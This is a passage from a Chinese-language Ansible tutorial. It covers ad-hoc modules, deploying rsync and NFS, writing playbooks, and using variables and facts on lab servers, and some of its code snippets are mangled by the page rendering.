ansible all -m get_url -a<span class="hljs-string">'url="https: ˌ tengine.taobao.org/download/tengine-2.3.3.tar.gz" dest=/app/tools/'</span>
</code></pre>
<h6 data-id="heading-41">c）yum_repository模块</h6>
<ul>
<li>书写好yum配置文件，copy分发过去即可。</li>
</ul>

































<table><thead><tr><th><strong>yum****源模块</strong><br/><strong>yum_repository</strong></th><th/></tr></thead><tbody><tr><td><strong>name</strong></td><td>yum源中名字 [epel]</td></tr><tr><td><strong>description</strong></td><td>yum源的注释说明 对应的 是name的内容</td></tr><tr><td><strong>baseurl</strong></td><td>yum源中 baseurl 下载地址</td></tr><tr><td><strong>enabled</strong></td><td>是否启动这个源 yes/no</td></tr><tr><td><strong>gpgcheck</strong></td><td>是否启动gpgcheck功能 no</td></tr><tr><td><strong>file</strong></td><td>指定yum源的文件 自动添加.repo 默认与模块名字</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh">root@m01 ~]<span class="hljs-comment"># cat /etc/yum.repos.d/epel.repo</span>
[epel]
name=Extra Packages <span class="hljs-keyword">for</span> Enterprise Linux 7 - <span class="hljs-variable">$basearch</span>
baseurl=http: ˌ mirrors.aliyun.com/epel/7/<span class="hljs-variable">$basearch</span>
failovermethod=priority
enabled=1
gpgcheck=0
gpgkey=file: ˎ etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7
</code></pre>
<pre><code class="hljs language-sh" lang="sh">-m yum_repository
-a <span class="hljs-string">'name=epel
description="Extra Packages for Enterprise Linux 7 -$basearch"
baseurl="http: ˌ mirrors.aliyun.com/epel/7/$basearch"
enabled=yes
gpgcheck=no
</span></code></pre>
<h5 data-id="heading-42">5.4用户管理</h5>
<ul>
<li><strong>user 用户管理</strong></li>
<li>group 用户组管理</li>
</ul>

































<table><thead><tr><th>user模块</th><th/></tr></thead><tbody><tr><td>name</td><td>用户名</td></tr><tr><td>uid</td><td>指定uid</td></tr><tr><td>group</td><td>指定用户组</td></tr><tr><td>shell</td><td>指定命令解释器</td></tr><tr><td>create_home</td><td>是否创建家目录（yes/no）</td></tr><tr><td>state</td><td>present 添加<br/>absent 删除</td></tr></tbody></table>
<ul>
<li>创建用户</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#创建www_ans用户 uid=2000的虚拟用户，先检查有没有该用户</span>
ansible all -a <span class="hljs-string">'id www_ans'</span>
ansible all -m user -a <span class="hljs-string">'name=www_ans uid=2000 shell=/sbin/nologin create_home=no state=present'</span>
</code></pre>
<ul>
<li>批量更新密码</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#官网文档，生成密码</span>
https://docs.ansible.com/ansible/latest/reference_appendices/faq.html<span class="hljs-comment">#how-do-i-generate-encrypted-passwords-for-the-user-module</span>

<span class="hljs-comment">#官方ansible生成密码</span>
ansible all -i localhost, -m debug -a <span class="hljs-string">"msg={{ '12366' | password_hash('sha512', 'mysecretsalt') }}"</span>

ansible all -m user -a <span class="hljs-string">'name=liux_ans password="$6$mysecretsalt$47o4R/btNUBdeUe.eAV/RbdNcZM7vXgMW
GhLsStZuSbzojBIhSKbrVC0UIFr4CLfLmusW6qmtgQ4SMhAFbcEl/" state=present'</span>

<span class="hljs-comment">#远程设置密码</span>
ansible all -m shell -a <span class="hljs-string">'echo 12366 |passwd --stdin liux_ans'</span>

</code></pre>
<h5 data-id="heading-43">5.5 ansible ad-hoc</h5>
<ul>
<li>ad-hoc简而言之就是“临时命令”，执行完即结束，并不会保存</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">1.yum模块
yum:
  name: 指定软件的名称
  state: 状态
      present: 安装软件
      absent:  卸载软件
[root@ansible ~]<span class="hljs-comment">#ansible backup -m yum -a 'name=rsync state=present'</span>

2.copy模块
copy:
     src: 源文件
     dest: 目标位置
     owner: 属主
     group: 属组
     mode: 权限
     content: 将content后面的字符串写入到dest目标文件中
     backup: <span class="hljs-built_in">yes</span>  复制前先将dest目标的文件进行备份
[root@ansible ~]<span class="hljs-comment"># ansible backup -m copy -a "src=1.txt dest=/root/ owner=ntp group=ntp mode=777 backup=yes"</span>
将密码文件写入到目标位置一定要和配置文件相同: /etc/rsync.passwd
[root@ansible ~]<span class="hljs-comment"># ansible backup -m copy -a 'content=rsync_backup:123456 dest=/etc/rsync.passwd mode=0600'</span>

3.group user模块
group:
	 name: 组的名称
	 gid:  组<span class="hljs-built_in">id</span>
	 state: present 和 absent
user:
     name: 用户名称
     uid: 666 指定uid号码
     group: www 不指定数字 指定组名称
     shell: /sbin/nologin  或者 /bin/bash
     create_home: <span class="hljs-literal">false</span>  <span class="hljs-comment"># 默认为true 创建 false不创建</span>
     state: present 创建
     state: absent  删除
     
创建组:
[root@ansible ~]<span class="hljs-comment"># ansible backup -m group -a 'name=www gid=666 state=present'</span>
创建用户:
[root@ansible ~]<span class="hljs-comment"># ansible backup -m user -a 'name=www uid=666 group=www shell=/sbin/nologin create_home=false state=present'</span>

4.file模块
file:
	path: 文件或目录的路径
    state: <span class="hljs-built_in">touch</span>     创建文件
           directory 创建目录
    	   <span class="hljs-built_in">link</span>      创建软链接
		   absent    删除
    owner:
 	group:
 	mode:

创建目录并修改权限
[root@ansible ~]<span class="hljs-comment"># ansible backup -m file -a 'path=/root/oldboy state=directory owner=www group=www recurse=yes'</span>

5.systemd模块
systemd:
       name: 服务名称
       state:
       	     started:     启动
       	     stopped:     停止
       	     restarted:   重启
       	     reloaded:    重新加载
       	     enabled: <span class="hljs-built_in">yes</span> 开机自动启动
       	     enabled: no  开机禁止启动
[root@ansible ~]<span class="hljs-comment"># ansible backup -m systemd -a 'name=rsyncd state=started enabled=yes'</span>

6.mount挂载模块
mount:
	 src: 源设备
	 path: 挂载到本地的路径
	 fstype: nfs
	 state:
            absent	   <span class="hljs-comment"># 卸载并且删除/etc/fstab配置 </span>
            mounted      <span class="hljs-comment"># 挂载并且写入到/etc/fstab</span>
            
 [root@ansible ~]<span class="hljs-comment"># ansible web01 -m mount -a 'src=172.16.1.31:/code/blog path=/mnt fstype=nfs state=mounted'</span>
 
 7.cron定时任务模块
cron:
	 minute: 分钟 */5
	 job: 定时任务命令
	 state: present 添加(不写默认就是创建或者添加)
	 	    absent  删除

[root@ansible ~]<span class="hljs-comment"># ansible web01 -m cron -a 'name=ntpdate minute=*/5 job="ntpdate ntp1.aliyun.com &amp;&gt;/dev/null"'</span>

8.其他模块
01）模块:commnd
[root@ansible ~]<span class="hljs-comment"># ansible web01 -m  command -a 'ifconfig eth0'</span>
02）script模块:
ansible web01 -m script -a  <span class="hljs-string">'/root/1.sh'</span>  <span class="hljs-comment"># 1.sh在ansible主机上</span>
03）get_url模块: 下载软件
get_url:
	   url: 链接
	   dest: 下载到本地的位置
[root@ansible ~]<span class="hljs-comment"># ansible web01 -m get_url -a 'url=https://img10.360buyimg.com/n1/g12/M00/08/03/rBEQYVGZ8F0IAAAAAAIapXb0bREAABlfAPtsn0AAhq9958.jpg dest=/root/'</span>

04）firewalld 停止防火墙
[root@ansible ~]<span class="hljs-comment"># ansible web01 -m systemd -a 'name=firewalld state=stopped enabled=no'</span>

05）selinux 关闭selinux
[root@ansible ~]<span class="hljs-comment"># ansible web01 -m selinux -a 'policy=targeted state=disabled'</span>

06）yum_repository: 配置YUM仓库模块
[root@ansible ~]<span class="hljs-comment"># ansible nfs -m yum_repository -a 'name=nginx description="Nginx YUM repo" baseurl=http://nginx.org/packages/centos/$releasever/$basearch/ enabled=yes gpgcheck=no gpgkey=https://nginx.org/keys/nginx_signing.key'</span>

07）shell模块
[root@ansible ~]<span class="hljs-comment"># ansible web01 -m shell -a 'ps axu|grep nginx'</span>
</code></pre>
<h5 data-id="heading-44">5.6 ad-hoc部署rsync</h5>
<pre><code class="hljs language-sh" lang="sh">----------------------------------------------
写出rsync手动部署的步骤
1)安装rsync服务
yum -y install rsync
2)配置rsync服务 提前将配置文件收集到ansible管理主机
[root@ansible ~]<span class="hljs-comment"># scp 10.0.0.41:/etc/rsyncd.conf .</span>
3)根据配置创建必要数据
创建www用户
创建密码文件/etc/rsync.passwd
密码权限600

创建目录
/backup
修改目录权限属主属组www

4)启动rsync服务
systemctl start rsyncd
systemctl <span class="hljs-built_in">enable</span> rsyncd
-----------------------------------------------
1.配置免密码登录
[root@ansible ~]<span class="hljs-comment"># ssh-copy-id -i .ssh/id_rsa.pub 10.0.0.41</span>
2.配置主机清单
root@ansible ~]<span class="hljs-comment"># cat /etc/ansible/hosts</span>
[nfs]
10.0.0.31
[webs]
web01 ansible_ssh_host=10.0.0.7 
web02 ansible_ssh_host=10.0.0.8
[backups]
backup ansible_ssh_host=10.0.0.41

3.通过ansible单条命令实现远程部署rsync服务
01）安装rsync
[root@ansible ~]<span class="hljs-comment"># ansible backup -m yum -a 'name=rsync state=present'</span>
02）配置rsync
将rsync配置文件拷贝到目标位置/etc/rsyncd.conf
[root@ansible ~]<span class="hljs-comment"># ansible backup -m copy -a 'src=rsyncd.conf dest=/etc/rsyncd.conf'</span>
03）根据配置文件创建必要数据
  a.创建组
[root@ansible ~]<span class="hljs-comment"># ansible backup -m group -a 'name=www gid=666 state=present'  </span>
  b.创建用户
[root@ansible ~]<span class="hljs-comment"># ansible backup -m user -a 'name=www uid=666 group=www shell=/sbin/nologin create_home=false state=present'</span>
  c.将密码文件写入到目标位置一定要和配置文件相同: /etc/rsync.passwd
[root@ansible ~]<span class="hljs-comment"># ansible backup -m copy -a 'content=rsync_backup:12366 dest=/etc/rsync.passwd mode=0600'</span>
  d.创建/backup并修改属主属组
[root@ansible ~]<span class="hljs-comment"># ansible backup -m file -a 'path=/backup state=directory owner=www group=www'</span>

4)启动服务
[root@ansible ~]<span class="hljs-comment"># ansible backup -m systemd -a 'name=rsyncd state=started enabled=yes'</span>
</code></pre>
<h5 data-id="heading-45">5.7 ad-hoc部署nfs</h5>
<pre><code class="hljs language-sh" lang="sh">------------------------------------------------
1.安装nfs
yum -y install nfs-utils
2.配置nfs
vim /etc/exports
/code/blog  172.16.1.0/24(rw,<span class="hljs-built_in">sync</span>,all_squash,anonuid=666,anongid=666)
3.根据配置文件创建必要数据
<span class="hljs-built_in">mkdir</span> -p /code/blog
创建www组和用户
授权/code/blog
4.启动nfs
------------------------------------------------
ansible部署NFS
1.密钥下发
ssh-copy-id -i /root/.ssh/id_rsa.pub 10.0.0.31
2.写入主机清单
[root@ansible ~]<span class="hljs-comment"># cat /etc/ansible/hosts </span>
[nfs]
10.0.0.31
3.安装nfs
ansible nfs -m yum -a <span class="hljs-string">'name=nfs-utils state=present'</span>
4.拷贝配置文件到/etc/exports
需提前拷贝一份写好的文件  scp 10.0.0.31:/etc/exports .
ansible nfs -m copy -a <span class="hljs-string">'src=exports dest=/etc/exports
5.根据配置创建数据
ansible nfs -m group -a '</span>name=www gid=666<span class="hljs-string">'
ansible nfs -m user -a '</span>name=www group=www uid=666 shell=/sbin/nologin create_home=<span class="hljs-literal">false</span><span class="hljs-string">'
ansible nfs -m file -a '</span>path=/code/blog/ state=directory owner=www group=www<span class="hljs-string">'

6.启动nfs
ansible nfs -m systemd -a '</span>name=nfs state=started enabled=<span class="hljs-built_in">yes</span><span class="hljs-string">'

7.挂载nfs
[root@m01 ~]# ansible web01 -m mount -a '</span>src=172.16.1.31:/code/blog path=/mnt fstype=nfs state=mounted<span class="hljs-string">'
</span></code></pre>
<h5 data-id="heading-46">5.8 setup模块</h5>
<pre><code class="hljs language-sh" lang="sh">1.查看主机所有详细信息
ansible web01 -m setup
2.获取ip地址
ansible web01 -m setup -a <span class="hljs-string">'filter=ansible_default_ipv4'</span>
3.获取主机名
ansible web01 -m setup -a <span class="hljs-string">'filter=ansible_fqdn'</span>
4.获取内存信息
ansible web01 -m setup -a <span class="hljs-string">'filter=ansible_memory_mb'</span>
5.获取磁盘信息
ansible web01 -m setup -a <span class="hljs-string">'filter=ansible_devices'</span>


6.其他参数信息
ansible_all_ipv4_addresses：仅显示ipv4的信息。
ansible_devices：仅显示磁盘设备信息。
ansible_distribution：显示是什么系统，例：centos,suse等。
ansible_distribution_major_version：显示是系统主版本。
ansible_distribution_version：仅显示系统版本。
ansible_machine：显示系统类型，例：32位，还是64位。
ansible_eth0：仅显示eth0的信息。
ansible_hostname：仅显示主机名。
ansible_kernel：仅显示内核版本。
ansible_lvm：显示lvm相关信息。
ansible_memtotal_mb：显示系统总内存。
ansible_memfree_mb：显示可用系统内存。
ansible_memory_mb：详细显示内存情况。
ansible_swaptotal_mb：显示总的swap内存。
ansible_swapfree_mb：显示swap内存的可用内存。
ansible_mounts：显示系统磁盘挂载情况。
ansible_processor：显示cpu个数(具体显示每个cpu的型号)。
ansible_processor_vcpus：显示cpu个数(只显示总的个数)
</code></pre>
<h4 data-id="heading-47">6.Ansible-剧本与变量（PlayBook）</h4>
<blockquote>
<p><code>PlayBook</code>即”剧本”，”兵书”之意，PlayBook是由以下部分组成的</p>
<p><code>play</code>: 定义的是主机的角色。（主角还是配角,找哪个明星）
<code>task</code>: 定义的是具体执行的任务。（角色的台词和动作）
<code>playbook</code>: 由一个或多个play（角色）组成，一个play（角色）可以包含多个task（台词，动作，大腕每集拍什么）</p>
</blockquote>
<h5 data-id="heading-48">6.1模块</h5>
<h6 data-id="heading-49">01 mount模块</h6>
<ul>
<li>实现mount命令进行挂载，可以修改/etc/fstab实现永久挂载</li>
</ul>

























<table><thead><tr><th>mount模块</th><th/></tr></thead><tbody><tr><td>fstype</td><td>指定文件系统：xfs、ext4，iso9660，nfs</td></tr><tr><td>src</td><td>源地址（nfs地址  172.16.1.31/data）</td></tr><tr><td>path</td><td>挂载点</td></tr><tr><td>==state==</td><td>==absent== 卸载并修改fstab文件 <br/>==mounted== 挂载并修改fstab 文件<br/>umounted 卸载不修改fstab文件<br/>present 仅修改/etc/fstab 不挂载<br/>remounted 重新挂载</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#通过ansible管理，在web01上挂载nfs：/data挂载到web01的/ans-upload/</span>
<span class="hljs-comment">#1.nfs    服务端配置，目录</span>
[root@nfs01 ~]<span class="hljs-comment"># showmount -e 172.16.1.31</span>
Export list <span class="hljs-keyword">for</span> 172.16.1.31:
/nfsdata 172.16.1.0/24
/data    172.16.1.0/24

<span class="hljs-comment">#2.web01  是否安装nfs</span>
[root@web01 ~]<span class="hljs-comment"># rpm -qa |grep nfs</span>
libnfsidmap-0.25-19.el7.x86_64
nfs-utils-1.3.0-0.68.el7.2.x86_64

<span class="hljs-comment">#3.web01  挂载</span>
ansible 172.16.1.7 -m mount -a <span class="hljs-string">'src=172.16.1.31:/data/ path=/ans-upload/ state=mounted fstype=nfs'</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/705446fa160e4ba9a5d18e21fae13a77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=DuC1SmkFyJryqLBrlBqk3XRztGo%3D" alt="image-20230328151958108" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/379709b9813e4a068acd2e7c847cc493~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=gvnopVQyHHHYKIisH2jEK490Cxc%3D" alt="image-20230328152339065" loading="lazy"/></p>
<h6 data-id="heading-50">02 cron 模块</h6>
<ul>
<li>用于管理系统的定时任务</li>
</ul>









































<table><thead><tr><th>cron 模块 定时任务</th><th/></tr></thead><tbody><tr><td>name</td><td>定时任务名称，对应下面注释的内容</td></tr><tr><td>minute</td><td>分钟</td></tr><tr><td>hour</td><td>小时</td></tr><tr><td>day</td><td>天</td></tr><tr><td>month</td><td>月</td></tr><tr><td>week</td><td>周</td></tr><tr><td>job</td><td>指定命令或脚本（定向到空）job="/sbin/nptdate   nt1aliyun.com &amp;&gt;/dev/null"</td></tr><tr><td>state</td><td>present 添加定时任务（默认）<br/>absent删除</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#2. sync time liux</span>
2 * * * * /sbin/ntpdate ntp1.aliyun.com &amp;&gt;/dev/null
</code></pre>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#批量创建定时任务</span>
ansible all -m cron -a <span class="hljs-string">'name="2. sync time liux" minute="*/5" job="/sbin/ntpdate ntp1.aliyun.com &amp;&gt;/devnull" state=present '</span>

<span class="hljs-comment">#查看</span>
ansible all -a <span class="hljs-string">'crontab -l'</span>

<span class="hljs-comment">#批量删除定时任务，通过name删除</span>
ansible all -m cron -a <span class="hljs-string">'name="2. sync time liux" state=absent'</span>
</code></pre>
<h5 data-id="heading-51">6.2 剧本</h5>
<ul>
<li>剧本:playbook 用于长久保存并且实现批量管理，维护，部署的文件</li>
<li>剧本yaml格式，yaml格式的文件.空格，冒号</li>
</ul>



































<table><thead><tr><th/><th>ans剧本</th><th>ans ad-hoc</th></tr></thead><tbody><tr><td>共同点</td><td>批量管理，使用模块</td><td>批量管理，使用模块</td></tr><tr><td>不同点</td><td>重复调用</td><td>不是很方便，不容易重复</td></tr><tr><td>应用建议（应用场景 ）</td><td>部署服务，多个步骤的服务</td><td>测试模块，临时性任务</td></tr><tr><td/><td/><td/></tr><tr><td/><td/><td/></tr></tbody></table>
<ul>
<li>剧本书写格式</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43a51b6c5dbd42b18c9a2e7f0411b8bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=wPiDSqdn6eNmySTcEaTiHsprtjE%3D" alt="image-20230328160616874" loading="lazy"/></p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#1. 书写剧本 注意以.yml或.yaml结尾</span>

<span class="hljs-comment">#2. 执行剧本</span>
ansible-playbook 01.show.yml
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/700e9ca333164084a6c5ef1c72c2448c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=fcvTmyZe%2BoRjK2KGvkOLZ6IRXhc%3D" alt="image-20230328160816391" loading="lazy"/></p>
<blockquote>
<p>执行的时候有奶牛:
可以删除软件或修改ansible.cfg配置进行关闭 #nocows = 1去掉注释即可</p>
<p>具体书写注意事项:
同一个层级的内容对齐的.
不同层级的通过2个空格对齐
不能使用tab键</p>
</blockquote>
<h5 data-id="heading-52">6.3剧本案例</h5>
<h6 data-id="heading-53">01 创建目录并分发文件</h6>
<blockquote>
<p>1.创建目录/server/files</p>
<p>2.将/etc/hosts文件分发过去 /server/files</p>
</blockquote>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#1.创建</span>
-m file  -a <span class="hljs-string">'path=/server/files state=directory'</span>
<span class="hljs-comment">#2.分发</span>
-m copy  -a <span class="hljs-string">'src=/etc/hosts dest=/server/files'</span>
</code></pre>
<ul>
<li>编辑剧本 vim /server/scripts/playbook/02.dist_file.yml</li>
</ul>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">hosts:</span> <span class="hljs-string">all</span>
  <span class="hljs-attr">tasks:</span> 
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">01</span> <span class="hljs-string">创建目录</span>
      <span class="hljs-attr">file:</span> 
        <span class="hljs-attr">path:</span> <span class="hljs-string">/server/files</span> 
        <span class="hljs-attr">state:</span> <span class="hljs-string">directory</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">02</span> <span class="hljs-string">分发文件</span>
      <span class="hljs-attr">copy:</span> 
        <span class="hljs-attr">src:</span> <span class="hljs-string">/etc/hosts</span> 
        <span class="hljs-attr">dest:</span> <span class="hljs-string">/server/files/</span>
</code></pre>
<ul>
<li>测试并分发</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ansible-playbook -C  02.dist_file.yml

<span class="hljs-comment"># -C 测试剧本是否有报错，不会真的创建于分发</span>

ansible-playbook  02.dist_file.yml
</code></pre>
<h6 data-id="heading-54">02 分发软件包，安装软件包，启动服务</h6>
<ul>
<li>zabbix-agent软件包,分发软件包</li>
<li>安装软件包</li>
<li>启动开机自启动</li>
</ul>
<h6 data-id="heading-55">03 nfs服务</h6>
<ul>
<li>
<p>nfs服务端：在backup上部署nfs服务，共享/backup-nfs目录，all_squash,nfsnobody</p>
</li>
<li>
<p>nfs客户端：web挂载 /ans-upload目录挂载 nfs服务端共享的/backup-nfs（永久挂载）</p>
</li>
<li>
<p>服务端流程：</p>
<ul>
<li>部署nfs-utils</li>
<li>修改配置文件</li>
<li>创建共享目录，改所有者</li>
<li>启动rpcbind，nfs</li>
</ul>
</li>
<li>
<p>客户端:</p>
<ul>
<li>安装nfs-utils</li>
<li>挂载与永久挂载</li>
</ul>
</li>
<li>
<p><strong>编写剧本</strong>   vim 04.deploy_nfs.yml</p>
</li>
</ul>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">hosts:</span> <span class="hljs-string">backup</span>
  <span class="hljs-attr">tasks:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">01</span><span class="hljs-string">.</span> <span class="hljs-string">部署nfs-utils</span>
      <span class="hljs-attr">yum:</span>
        <span class="hljs-attr">name:</span> <span class="hljs-string">nfs-utils,rpcbind</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">installed</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">02</span><span class="hljs-string">.</span> <span class="hljs-string">修改配置文件</span>
      <span class="hljs-comment">#copy发送过去</span>
      <span class="hljs-attr">lineinfile:</span>
        <span class="hljs-attr">path:</span> <span class="hljs-string">/etc/exports</span>
        <span class="hljs-attr">line:</span> <span class="hljs-string">"/backup-nfs/ 172.16.1.0/24(rw,all_squash) "</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">03</span><span class="hljs-string">.</span> <span class="hljs-string">共享目录</span>
      <span class="hljs-attr">file:</span>
        <span class="hljs-attr">path:</span> <span class="hljs-string">/backup-nfs/</span>
        <span class="hljs-attr">owner:</span> <span class="hljs-string">nfsnobody</span>
        <span class="hljs-attr">group:</span> <span class="hljs-string">nfsnobody</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">directory</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">04</span><span class="hljs-string">.</span> <span class="hljs-string">启动服务rpc</span>
      <span class="hljs-attr">systemd:</span>
        <span class="hljs-attr">name:</span> <span class="hljs-string">rpcbind</span>
        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">yes</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">started</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">04</span><span class="hljs-string">.</span> <span class="hljs-string">启动服务nfs</span>
      <span class="hljs-attr">systemd:</span>
        <span class="hljs-attr">name:</span> <span class="hljs-string">nfs</span>
        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">yes</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">started</span>

<span class="hljs-bullet">-</span> <span class="hljs-attr">hosts:</span> <span class="hljs-string">web</span>
  <span class="hljs-attr">tasks:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">01</span><span class="hljs-string">.</span> <span class="hljs-string">部署服务</span>
      <span class="hljs-attr">yum:</span>
        <span class="hljs-attr">name:</span> <span class="hljs-string">nfs-utils,rpcbind</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">installed</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">02</span><span class="hljs-string">.</span> <span class="hljs-string">挂载</span>
      <span class="hljs-attr">mount:</span>
        <span class="hljs-attr">src:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.1</span><span class="hljs-number">.41</span><span class="hljs-string">:/backup-nfs/</span>
        <span class="hljs-attr">path:</span> <span class="hljs-string">/ans-upload/</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">mounted</span>
        <span class="hljs-attr">fstype:</span> <span class="hljs-string">nfs</span>

</code></pre>
<ul>
<li>测试</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">ansible-playbook  04.deploy_nfs.yml 
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fc5656c37be4464b1b371323260820f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=QmsHIz81kdkGPoAmYkOyXa8xogU%3D" alt="image-20230328204825838" loading="lazy"/></p>
<h5 data-id="heading-56">6.4 ansible中的变量(vars)</h5>
<ul>
<li>变量无处不在</li>
</ul>

































<table><thead><tr><th>可以定义变量的地方</th><th/></tr></thead><tbody><tr><td>invertory主机清单中定义变量</td><td>可以用于批量修改主机</td></tr><tr><td>命令行中</td><td>几乎不用</td></tr><tr><td>==在剧本文件中定义==</td><td>比较常用</td></tr><tr><td>变量文件，==根据主机清单的分组进行定义变量==</td><td>如果多个剧本，使用相同的变量</td></tr><tr><td>facts变量</td><td>一般用户获取主机基本信息：ip，主机名，系统（centos/ubuntu）<br/>如果不需要可以关闭，用于加速剧本的执行</td></tr><tr><td>==register 变量（注册变量）==</td><td>ip=<code>hostname -I</code>  调用命令结果</td></tr></tbody></table>
<h6 data-id="heading-57">01 在剧本(playbook)中定义变量:arrow_up_small:</h6>
<ul>
<li>批量创建/liux/test/upload</li>
</ul>
<pre><code class="hljs language-yaml" lang="yaml">[<span class="hljs-string">root@m01</span> <span class="hljs-string">playbook</span>]<span class="hljs-comment"># cat 05.vars.yml </span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">hosts:</span> <span class="hljs-string">all</span>
  <span class="hljs-attr">vars:</span>
    <span class="hljs-attr">dir:</span> <span class="hljs-string">/liux/test/upload</span>
  <span class="hljs-attr">tasks:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mkdir</span>
      <span class="hljs-attr">file:</span>
        <span class="hljs-attr">path:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{ dir }}</span>"</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">directory</span>

</code></pre>
<blockquote>
<p>温馨提示：如果变量是某个选项的开头，则变量引用的时候需要加上双引号。</p>
<p>path: "{{ dir }}"</p>
<p>path: /app/{{ dir }}   这种可以不加</p>
</blockquote>
<h6 data-id="heading-58">02 共用变量-变量文件:star::star::star:</h6>
<pre><code class="hljs language-sh" lang="sh">[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat 05.vars.yml</span>
- hosts: all
vars_files: ./vars.yml
tasks:
- name: file
file:
path: <span class="hljs-string">"{{ dir }}/{{ user }}-{{ file }}"</span>
state: <span class="hljs-built_in">touch</span>

[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat vars.yml</span>
<span class="hljs-built_in">dir</span>: /tmp/
file: lidao.txt
user: lidao996kkk
</code></pre>
<h6 data-id="heading-59">03 主机组创建变量文件 (官方推荐)</h6>
<ul>
<li>group_vars</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">group_vars/
lb/vars.yml <span class="hljs-comment">#存放lb组的变量</span>
web/vars.yml <span class="hljs-comment">#存放web组的变量</span>
data/vars.yml <span class="hljs-comment">#存放xxx组的变量</span>
all/vars.yml <span class="hljs-comment">#所有主机共用的变量</span>
</code></pre>
<ul>
<li>创建属于liux用户的文件</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat 05.vars.yml</span>
- hosts: all
  tasks:
    - name: file
      file:
        path: <span class="hljs-string">"{{ dir }}/{{ user }}-{{ file }}"</span>
        owner: <span class="hljs-string">"{{ user }}"</span>
        group: <span class="hljs-string">"{{ user }}"</span>
        state: <span class="hljs-built_in">touch</span>


[root@m01 /server/scripts/playbook]<span class="hljs-comment"># tree -F</span>
├── 05.vars.yml
└── group_vars/
      └── all/
        └── vars.yml



[root@m01 /server/scripts/playbook]<span class="hljs-comment"># cat  group_vars/all/vars.yml</span>
<span class="hljs-built_in">dir</span>: /opt/
file: liux.txt
user: liux
</code></pre>
<blockquote>
<p>⚠温馨提示: group_vars应用提示</p>
<p>​                       一般使用group_vars中的all分组即可</p>
</blockquote>
<h6 data-id="heading-60">04 facts变量</h6>
<blockquote>
<p>Ansible facts是在被管理追击上通过Ansible自动采集发现的变量。<code>facts</code>包含每台特定的主机信息。比如：被控端的主机名、IP地址、系统版本、CPU数量、内存状态、磁盘状态等等</p>
</blockquote>
<ul>
<li>
<p>运行剧本的时候ans会收集每个主机的基本信息,这些信息形成的变量叫做facts变量.</p>
</li>
<li>
<p>facts变量setup模块获取</p>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">常用fact变量
 ansible_hostname <span class="hljs-comment">#主机名</span>
